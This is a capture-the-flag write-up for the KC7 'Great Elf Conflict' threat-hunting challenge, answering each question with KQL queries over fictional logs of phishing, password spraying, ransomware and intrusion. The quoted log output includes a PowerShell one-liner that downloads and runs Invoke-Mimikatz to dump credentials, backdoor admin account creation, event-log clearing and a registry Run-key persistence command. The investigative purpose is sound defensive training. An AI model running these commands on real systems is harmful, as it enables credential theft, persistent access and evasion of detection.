### Microsoft KC7
Answer two sections for silver, all four sections for gold.<br>
Difficulty: 3/5<br>
Solved: KQL 101, Operation Surrender, Operation Snowfall, Echoes in the Frost

---

### KQL 101
#### Question 1
*Welcome to your mission to solve the The Great Elf Conflict! To do so, you'll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.*

*Your next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival.*

*Eve greets you with a nod and gestures toward the terminal. "KQL is like a key, unlocking the hidden secrets buried within the data."*

***Type `let’s do this` to begin your KQL training.***
> let's do this

#### Question 2
*Eve has shared the first table with you. Now, run a take 10 on all the other tables to see what they contain.*

***Once you've examined all the tables, type `when in doubt take 10` to proceed***
> when in doubt take 10

```sql
{TABLE}
| take 10;
```

We use the query above to find information about each of the the nine tables:
1. Authentication Events: contains information about successful and unsuccessful login attempts
2. Email: contains information about emails sent and received by the employees
3. Employees: contains information about the employees
4. FileCreationEvents: contains information about files created
5. InboundNetworkEvents: contains information about the websites that employees visit
6. OutboundNetworkEvents: contains information about employees website browsing history
7. PassiveDns: contains DNS records
8. ProcessEvents: contains information on the process created and ran on employees computers
9. SecurityAlerts: contains security alerts from an employees computers and emails

#### Question 3
*Now, let’s gather more intelligence on the employees. To do this, we can use the count operator to quickly calculate the number of rows in a table. This is helpful for understanding the scale of the data you’re working with.*

***How many elves did you find?***
> 90

```sql
Employees
| count;
```

#### Question 4
*You can use the where operator with the Employees table to locate a specific elf.*

***Can you find out the name of the Chief Toy Maker?***
> Shinny Upatree

```sql
Employees
| where role=="Chief Toy Maker"
| project name;
```

#### Question 5
***Type `operator` to continue.***
> operator

#### Question 6
*We can learn more about an elf by cross-referencing information from other tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve her email address from the Employees table, and then use it in a query in the Email table.*

***How many emails did Angel Candysalt receive?***
> 31

First we get Angel Candysalt's email from the `Employees` table:

```sql
Employees
| where name=="Angel Candysalt"
| project email_addr;
```

Then in the `Email` table, we use Angel Candysalt's email to find and count emails she received:

```sql
Email
| where recipient == "angel_candysalt@santaworkshopgeeseislands.org"
| count;
```

#### Question 7
*You can use the distinct operator to filter for unique values in a specific column.*

***How many distinct recipients were seen in the email logs from twinkle_frostington@santaworkshopgeeseislands.org?***
> 32

```sql
Email
| where sender has "twinkle_frostington@santaworkshopgeeseislands.org"
| distinct recipient
| count;
```

#### Question 8
***How many distinct websites did Twinkle Frostington visit?***
> 4

First we get Twinkle Frostington's IP Address from `Employees` table:

```sql
Employees
| where name=="Twinkle Frostington"
| project ip_addr;
```

Then in the `OutboundNetworkEvents` table, we use his IP Address to find and count the distinct websites he visited:

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.36"
| distinct url
| count;
```

#### Question 9
***How many distinct domains in the PassiveDns records contain the word green?***
> 10

```sql
PassiveDns
| where domain contains "green"
| distinct domain
| count;
```

#### Question 10
***How many distinct URLs did elves with the first name Twinkle visit?***
> 8

We use the `Employees` table to make a list named `twinkle_ips` which contains the IP Addresses of every employee with the first name `Twinkle`. Then in the `OutboundNetworkEvents` table, we find and count all of the distinct websites that were visited by one of the IP Addresses in our `twinkle_ips` list:

```sql
let twinkle_ips =
    Employees
    | where name has "Twinkle"
    | distinct ip_addr;
OutboundNetworkEvents  
| where src_ip in (twinkle_ips)  
| distinct url
| count;
```
--- 

### Operation Surrender: Alabaster's Espionage
#### Question 1
*Eve Snowshoes approaches with a focused expression. "Welcome to Operation Surrender: Alabaster's Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You'll need to piece together the clues and analyze the data to understand how they gained an advantage."*

***Type `surrender` to get started!***
> surrender

#### Question 2
*Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.*

***Who was the sender of the phishing email that set this plan into motion?***
> surrender@northpolemail.com

We filter for emails where the subject contained the keyword `surrender` to find all the phishing emails. Using the `distinct` operator, we that all the phishing emails were sent by the email `surrender@northpolemail.com`:

```sql
Email
| where subject has "surrender"
| distinct sender;
```

#### Question 3
*Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.*

**How many elves from Team Wombley received the phishing email?**
> 22

Similarly to question 3, we find all the phishing emails and then count each distinct member of Team Wombley who received one.

```sql
Email
| where subject has "surrender"
| distinct recipient
| count;
```

#### Question 4
*The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.*

*To understand the full extent of this operation, we need to identify the file where the link led to in the email.*

***What was the filename of the document that Team Alabaster distributed in their phishing email?***
> Team_Wombley_Surrender.doc

Similarly to questions 3 and 4, we find all the phishing emails and their corresponding links:

```sql
Email
| where subject has "surrender"
| distinct link;
```

Looking at every distinct link sent in the phishing emails, we see that every link leads to a file named `Team_Wombley_Surrender.doc`:

```
https://albastersurrender.org/search/search/images/Team_Wombley_Surrender.doc
https://albastersurrender.org/search/Team_Wombley_Surrender.doc
https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc
https://albastersurrender.org/files/public/published/share/Team_Wombley_Surrender.doc
http://albastersurrender.org/online/Team_Wombley_Surrender.doc
http://albastersurrender.org/modules/public/files/Team_Wombley_Surrender.doc
http://albastersurrender.org/images/Team_Wombley_Surrender.doc
```

#### Question 5
*As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you'll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.*

***Who was the first person from Team Wombley to click the URL in the phishing email?***
> Joyelle Tinseltoe

First we use the `Employees` table to match the employee's names and IP Addresses. Next we find each time an employee clicked on the phishing link. After sorting by time, the first employee to click the link should be at the top of the list:

```sql
Employees
| join kind=inner (OutboundNetworkEvents) on $left.ip_addr == $right.src_ip
| where url contains "Team_Wombley_Surrender.doc"
| sort by timestamp asc
| project name
| take 1;
```
 
#### Question 6
*Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.*

*Your mission is to determine the name of the file that was created after the .doc was executed.*

*Focus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for.*

***What was the filename that was created after the .doc was downloaded and executed?***
> keylogger.exe

First we get Joyelle Tinseltoe's hostname and IP Address from the `Employees` table:

```sql
Employees
| where name == "Joyelle Tinseltoe"
| project hostname , ip_addr
| take 1;
```

Next altering our query from question 5, we get the time that Joyelle Tinseltoe clicked on the phishing link:

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.25"
| where url has "Team_Wombley_Surrender.doc"
| sort by timestamp asc
| project timestamp, url
| take 1;
```

Next using the values from the above queries, we look at the two process started by Joyelle Tinseltoe's computer directly after she clicked the phishing link:

```sql
ProcessEvents
| where timestamp  >= datetime("2024-11-27T14:11:45Z")
| where hostname == "Elf-Lap-W-Tinseltoe"
| sort by timestamp asc
| project timestamp, process_commandline
| take 2;
```

The first processing started on Joyelle Tinseltoe's computer was the creation and execution of a file named `Team_Wombley_Surrender.doc`. The subsequent process was the creation of a file named `keylogger.exe`:

```
Explorer.exe "C:\Users\jotinseltoe\Downloads\Team_Wombley_Surrender.doc"
C:\Users\Public\AppData\Roaming\keylogger.exe
```
 
#### Question 7
> a2V5bG9nZ2VyLmV4ZQ==

```sql
let flag = "keylogger.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

#### Operation Surrender: Alabaster's Espionage Timeline

```
2:09 - First phishing email recieved
2:11 - Joyelle Tinseltoe clicks phishing link
2:12 - Team_Wombley_Surrender.doc is downloaded
2:12 - Team_Wombley_Surrender.doc is ran
2:12 - keylogger.exe is downloaded
2:20 - ElfKeyLoggerTask is scheduled to run every five minutes
```

---

### Operation Snowfall: Team Wombley's Ransomware Raid
#### Question 1
*"Fantastic work on completing Section 2!" Eve Snowshoes, Senior Security Analyst, says with a proud smile.*

*"You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.*

*But now, we embark on Operation Snowfall: Team Wombley’s Ransomware Raid. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!"*

***Type `snowfall` to begin***
> snowfall

#### Question 2
*Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack.*

***What was the IP address associated with the password spray?***
> 59.171.58.12

First we how many failed login attempts each distinct IP Address has. The IP Address with the most failed logins is the one associated with the password spray:

 ```sql
AuthenticationEvents
| where result == "Failed Login"
| summarize FailedAttempts = count() by src_ip, result
| sort by FailedAttempts desc;
```

#### Question 3

*After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.*

*Eve Snowshoes weighs in: "This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated."*

***How many unique accounts were impacted where there was a successful login from 59.171.58.12?***
> 23

Using the IP Address from question 2, we find all of the distinct accounts that the attacker successfully logged into:

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| distinct username
| count;
```

#### Question 4
*In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.*

*Eve Snowshoes remarks, "Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems."*

***What service was used to access these accounts/devices?***
> RDP
 
Similarly to question 3, we find information all of the attackers successful logins:

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| distinct description;
```

We find that the attacker accessed all of the accounts/devices via RDP:

```
User successfully logged onto Elf-Lap-A-Ribbonson via RDP.
User successfully logged onto Elf-Lap-A-Nutmeggins via RDP.
User successfully logged onto Elf-Lap-A-Jinglebellsworth via RDP.
User successfully logged onto Elf-Lap-A-Snowflakebreeze via RDP.
User successfully logged onto Elf-Lap-A-Wintershine via RDP.
User successfully logged onto Elf-Lap-A-Snowfall via RDP.
User successfully logged onto Elf-Lap-A-Merryweather via RDP.
User successfully logged onto Elf-Lap-A-Mistletooth via RDP.
User successfully logged onto Elf-Lap-A-Snowbell via RDP.
User successfully logged onto Elf-Lap-A-Twinkletoes via RDP.
User successfully logged onto Elf-Lap-A-Pineconewood via RDP.
User successfully logged onto Elf-Lap-A-Snowball via RDP.
User successfully logged onto Elf-Lap-A-Snowywhisk via RDP.
User successfully logged onto Elf-Lap-A-Gingerbread via RDP.
User successfully logged onto Elf-Lap-A-Winterwhisper via RDP.
User successfully logged onto Elf-Lap-A-Elfbright via RDP.
User successfully logged onto Elf-Lap-A-Snowdrift via RDP.
User successfully logged onto Elf-Lap-A-Sugarplum via RDP.
User successfully logged onto Elf-Lap-A-Frostington via RDP.
```

#### Question 5

*Once Team Wombley gained access to Alabaster's system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, "When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response.*

***What file was exfiltrated from Alabaster’s laptop?***
> Secret_Files.zip

 
First we get Alabaster's username from the `Employees` table:

```sql
Employees
| where name has "Alabaster"
| project username;
```

Next we find the time when the attacker successfully logged into Alabaster's account:

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| where username == "alsnowball"
| project timestamp;
```

We use the results from the above queries, to find all the commands copying and moving files that the attacker executed on Alabaster's account:

```sql
ProcessEvents
| where timestamp >= datetime("2024-12-11T01:39:50Z")
| where username == "alsnowball"
| where process_commandline has "copy" or process_commandline has "move"
| project process_commandline;
```

Looking at commands, we see that the last command copied Alabaster's file `Secret_Files.zip` to a network share `\\wocube\share`:

```
Copy-Item "C:\\Malware\\EncryptEverything.exe" -Destination "C:\\Windows\\Users\\alsnowball"
copy C:\Windows\Users\alsnowball\top secret\Snowball_Cannon_Plans.pdf C:\Users\alsnowball\Documents\Snowball_Cannon_Plans.pdf
copy C:\Windows\Users\alsnowball\top secret\Drone_Configurations.pdf C:\Users\alsnowball\Documents\Drone_Configurations.pdf
move C:\Users\alsnowball\Documents\Secret_Files.zip C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip
copy C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip \\wocube\share\alsnowball\Secret_Files.zip
```

#### Question 6
*After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.*

*Eve Snowshoes comments, "The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system."*

***What is the name of the malicious file that was run on Alabaster's laptop?***
> EncryptEverything.exe

First we get the time that the attacker exfiltrated files from Alabaster's laptop:

```sql
ProcessEvents
| where username == "alsnowball"
| where process_commandline == "copy C:\\Users\\alsnowball\\AppData\\Local\\Temp\\Secret_Files.zip \\\\wocube\\share\\alsnowball\\Secret_Files.zip"
| project timestamp;
```

Next we get all of the commands the attacker ran after the exfilitration:

```sql
ProcessEvents
| where timestamp >= datetime("2024-12-16T15:51:52Z")
| where username == "alsnowball"
| project process_commandline;
```

Looking at the first command, we see that the attacker ran malicious file `EncryptEverything.exe`:

```
C:\Windows\Users\alsnowball\EncryptEverything.exe
copy C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip \\wocube\share\alsnowball\Secret_Files.zip
del C:\Users\alsnowball\Documents\Snowball_Cannon_Plans.pdf
del C:\Users\alsnowball\Documents\Drone_Configurations.pdf
del C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\103.0.1264.77\msedgewebview2.exe" --type=utility 
C:\Windows\System32\cmd.exe nslookup google.com
```

#### Question 7
> RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl

```sql
let flag = "EncryptEverything.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

#### Timeline
```
12/10  6:36 - Password Spray Begins
12/11  1:39 - Attacker logs in as Alabaster
12/15  2:52 - Attaker downloads EncryptEverything.exe
12/16  3:51 - Attacker exfilitrates Secret_Files.zip to \\wocube\share
12/17 10:40 - Attacker runs EncryptEverything.exe
```

---

### Echoes in the Frost: Tracking the Unknown Threat
#### Question 1
*As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. "You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well."*

*She pauses, the weight of the challenge ahead clear. "This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost."*

***Type `stay frosty` to begin***
> stay frosty

#### Question 2
*Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.*

*Eve Snowshoes remarks, "The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves."*

***What was the timestamp of first phishing email about the breached credentials received by Noel Boetie?***
> 2024-12-12T14:48:55Z

First we get Noel Boetie's email from the `Employees` table:

```sql
Employees
| where name == "Noel Boetie"
| project email_addr;
```

We filter for emails where the subject contained the keyword `breach` to find all the phishing emails. Then we find the time that the first phishing email was sent to Noel Boetie:

```sql
Email
| where recipient =="noel_boetie@santaworkshopgeeseislands.org"
| where subject has "breach"
| sort by timestamp asc
| project timestamp
| take 1;
```

#### Question 3
*Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.*

***When did Noel Boetie click the link to the first file?***
> 2024-12-12T15:13:55Z

First we get Noel Boetie's IP Address from the `Employees` table:

```sql
Employees
| where name == "Noel Boetie"
| project ip_addr;
```

Similarly to question 2, we get the link in the first phishing email:

```sql
Email
| where recipient =="noel_boetie@santaworkshopgeeseislands.org"
| where subject has "breach"
| sort by timestamp asc
| project link
| take 1;
```

Lastly, we use the results from the above queries to serach for the first time that Noel Boetie visited the phishing link:

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.9"
| where url =="https://holidaybargainhunt.io/published/files/files/echo.exe"
| sort by timestamp asc
| project timestamp;
```

#### Question 4
*The phishing email directed Noel Boetie to download a file from an external domain.*

*Eve Snowshoes, "The domain and IP they used to host the malicious file is a key piece of evidence. It might lead us to other parts of their operation, so let’s find it."*

***What was the IP for the domain where the file was hosted?***
> 182.56.23.122

Using the link from the query above, we find that the domain where the file hosted is `holidaybargainhunt.io`. Next search the `PassiveDns` table for a matching IP Address:

```sql
PassiveDns
| where domain == "holidaybargainhunt.io"
| distinct ip
| take 1;
```

#### Question 5
*Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.*

*It’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.*

*Eve Snowshoes suggests, "We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials."*

*Let’s take a closer look at the authentication events. I wonder if any connection events from 182.56.23.122.* 

***If so what hostname was accessed?***
> WebApp-ElvesWorkshop

We use the matching IP Address we for the attacker's domain from question 4:

```sql
AuthenticationEvents
| where src_ip == "182.56.23.122"
| project hostname
| take 1;
```

#### Question 6
*It appears someone accessed the WebApp-ElvesWorkshop from the IP address 182.56.23.122. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.*

*Eve Snowshoes, "Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system."*

***What was the script that was run to obtain credentials?***
> Invoke-Mimikatz.ps1

Similarly to question 5, we get the time that the attacker accessed the web app:

```sql
AuthenticationEvents
| where src_ip == "182.56.23.122"
| project timestamp, hostname
| take 1;
```

Next we use the hostname from question 5 and the time from the above query to search for commands that the attacker ran on the web app:

```sql
ProcessEvents
| where hostname =="WebApp-ElvesWorkshop"
| where timestamp >= datetime("2024-11-29T12:25:03Z")
| project process_commandline;
```

Looking at the attacker's commands we see that the 5th command downloads and runs a powershell script `Mimikatz.ps1` that dumps login credentials:

```
ipconfig /all
net localgroup administrators frosty /add
net user frosty AllYourBaseBelongToUs /add
net view /domain
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords"
tasklist | findstr /I "avp.exe"
tasklist | findstr /I "mcshield.exe"
tasklist | findstr /I "norton.exe"
```

#### Question 7
*Okay back to Noel, after downloading the file, Noel Boetie followed the instructions in the email and ran it, but mentioned that nothing appeared to happen.*

*Since the email came from an internal source, Noel assumed it was safe - yet this may have been the moment the unknown threat actor silently gained access. We need to identify exactly when Noel executed the file to trace the beginning of the attack.*

*Eve Snowshoes, "It’s easy to see why Noel thought the email was harmless - it came from an internal account. But attackers often use compromised internal sources to make their phishing attempts more believable."*

***What is the timestamp where Noel executed the file?***
> 2024-12-12T15:14:38Z

First we get Noel Boetie's username from the `Employees` table:

```sql
Employees
| where name == "Noel Boetie"
| project username
| take 1;
```

From question 3, we know the time that Noel Boetie clicked on the phishing link. Additionally we know the link was to a file named `echo.exe`. Using the above query and the information from question 3, we search for processes involving the `echo.exe` file on Noel Boetie's computer that ran after he clicked on the phishing link:

```sql
ProcessEvents
| where username == "noboetie"
| where timestamp >= datetime("2024-12-12T15:13:55Z")
| where process_commandline has "echo.exe"
| sort by timestamp asc
| project timestamp, process_commandline;
```

#### Question 8
*After Noel ran the file, strange activity began on the system, including the download of a file called holidaycandy.hta. Keep in mind that attackers often use multiple domains to host different pieces of malware.*

*Eve explains, "Attackers frequently spread their operations across several domains to evade detection."*

***What domain was the holidaycandy.hta file downloaded from?***
> compromisedchristmastoys.com

We search the `OutboundNetworkEvents` table for events downloading a file named `holidaycandy.hta`:

```sql
OutboundNetworkEvents
| where url contains "holidaycandy.hta"
| distinct url
| take 1;
```

We find that the file was downloaded from the link `http://compromisedchristmastoys.com/holidaycandy.hta`.

#### Question 9
*An interesting series of events has occurred: the attacker downloaded a copy of frosty.txt, decoded it into a zip file, and used tar to extract the contents of frosty.zip into the Tasks directory.*

*This suggests the possibility that additional payloads or tools were delivered to Noel’s laptop. We need to investigate if any additional files appeared after this sequence.*

*Eve Snowshoes, "When an attacker drops files like this, it’s often the prelude to more malicious actions. Let’s see if we can find out what else landed on Noel’s laptop."*

*Did any additional files end up on Noel’s laptop after the attacker extracted frosty.zip?*

***what was the first file that was created after extraction?***
> sqlwriter.exe

We find the time that the attacker use the `tar` command to extract the contents of `frosty.zip`:

```sql
ProcessEvents
| where process_commandline has "tar" and process_commandline has "frosty.zip"
| project timestamp;
```

Using the above query, we search for the first file created after the attacker unzipped `frosty.zip`:

```sql
FileCreationEvents
| where timestamp >= datetime("2024-12-24T17:19:45Z")
| sort by timestamp asc
| project filename
| take 1;
```

#### Question 10
*In the previous question, we discovered that two files, sqlwriter.exe and frost.dll, were downloaded onto Noel’s laptop. Immediately after, a registry key was added that ensures sqlwriter.exe will run every time Noel’s computer boots.*

*This persistence mechanism indicates the attacker’s intent to maintain long-term control over the system.*

*Eve Snowshoes, "Adding a registry key for persistence is a classic move by attackers to ensure their malicious software runs automatically. It’s crucial to understand how this persistence is set up to prevent further damage."*

***What is the name of the property assigned to the new registry key?***
> frosty

First we find the time where the `sqlwriter.exe` and `frost.dll` files were downloaded:

```sql
FileCreationEvents
| where filename == "sqlwriter.exe" or filename == "frost.dll"
| sort by timestamp desc
| project timestamp
| take 1;
```

Using the above query, we search for commands involving the `sqlwriter.exe` file that were executed on Noel’s computer after the two files were downloaded:

```sql
ProcessEvents
| where username == "noboetie"
| where timestamp >= datetime("2024-12-24T18:40:25Z")
| where process_commandline has "sqlwriter.exe"
| project process_commandline;
```

Looking at the command returned from our above query, we see that the attacker added a registry key named `frosty`:

```powershell
New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force
```

#### Question 11
> ZnJvc3R5

```sql
let finalflag = "frosty";
let base64_encoded = base64_encode_tostring(finalflag);
print base64_encoded
```

#### Timeline
```
11/29 12:25 - Attacker logs into web server
12/10 12:00 - Attacker runs Invoke-Mimikatz.ps1 to get login credetnials on web server
12-10  8:55 - Attacker adds frosty user to web server
12-10  8:57 - Attacker adds frosty user to local administrators group
12-12  2:48 - Noel gets the first phishing email 
12-12  3:13 - Noel clicks the phishing link
12-12  3:14 - Noel downloads echo.exe
12-12  3:14 - Noel runs echo.exe
12-12  3:39 - Noel downloads holidaycandy.hta 
12-24  5:18 - Noel downlaods frosty.zip
12-24  5:19 - Noel unzips frosty.zip
12-24  5:54 - Noel downloads sqlwriter.exe
12-24  6:40 - Noel downloads frost.dll
12-24  6:40 - Noel adds registry key that runs sqlwriter.exe everythime his computer boots
```

---

